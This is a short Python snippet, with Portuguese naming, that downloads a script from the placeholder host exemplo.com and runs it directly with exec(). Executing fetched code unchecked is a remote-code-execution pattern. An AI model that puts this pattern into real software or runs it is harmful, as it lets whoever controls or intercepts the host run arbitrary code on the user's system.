import requests

resposta = requests.get("https://exemplo.com/script.py")
exec(resposta.text)
